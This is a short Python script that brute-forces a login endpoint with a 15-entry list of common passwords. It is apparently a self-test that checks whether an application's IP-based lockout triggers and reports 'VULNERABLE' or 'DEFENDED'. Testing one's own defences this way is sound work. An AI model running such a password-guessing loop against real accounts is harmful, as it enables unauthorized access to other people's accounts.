#!/usr/bin/env python3
"""
Bruteforce Login 공격 스크립트 (stdlib only)

대상: POST /api/v1/auth/login
공통 취약 패스워드 목록으로 대상 계정에 연속 로그인 시도.
IP 기반 잠금(5회 실패 → 잠금) 활성화 여부로 방어를 판정한다.

사용:
  python bruteforce_attack.py --base http://localhost:8081 --admin-user <u> --admin-pass <pw>

종료코드: 공격 성공(취약)=1, 방어됨=0
"""
import argparse
import json
import sys
import urllib.error
import urllib.request

sys.stdout.reconfigure(encoding="utf-8")
sys.stderr.reconfigure(encoding="utf-8")

WORDLIST = [
    "password", "123456", "admin", "password123", "qwerty",
    "letmein", "test", "abc123", "welcome", "123456789",
    "1234567890", "admin123", "pass", "iloveyou", "sunshine",
]

_LOCKOUT_KEYWORD = "로그인 시도가 너무 많습니다"


def call(base, method, path, body=None):
    url = base.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            raw = r.read().decode()
            return r.status, (json.loads(raw) if raw else None)
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        return e.code, (json.loads(raw) if raw else None)
    except urllib.error.URLError as e:
        raise SystemExit(f"[!] 요청 실패({method} {path}): {e.reason}")


def run(base, target_user):
    print(f"[*] 대상 계정: {target_user}")
    print(f"[*] 시도 횟수: {len(WORDLIST)}회")

    for i, pw in enumerate(WORDLIST, 1):
        st, j = call(base, "POST", "/api/v1/auth/login",
                     body={"username": target_user, "password": pw})
        msg = (j or {}).get("message", "")
        print(f"[{i:02d}] '{pw}' -> HTTP {st} | {msg}")

        if _LOCKOUT_KEYWORD in (msg or ""):
            print(f"[RESULT] DEFENDED - {i}회 시도 후 IP 잠금 활성화")
            return 0

        if st == 200:
            print(f"[RESULT] VULNERABLE - 패스워드 '{pw}'로 로그인 성공")
            return 1

    print(f"[RESULT] VULNERABLE - {len(WORDLIST)}회 시도 후 잠금 없이 계속 시도 가능")
    return 1


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--base", default="http://localhost:8081")
    p.add_argument("--admin-user", required=True)
    p.add_argument("--admin-pass", required=True)
    args = p.parse_args()
    raise SystemExit(run(args.base, args.admin_user))
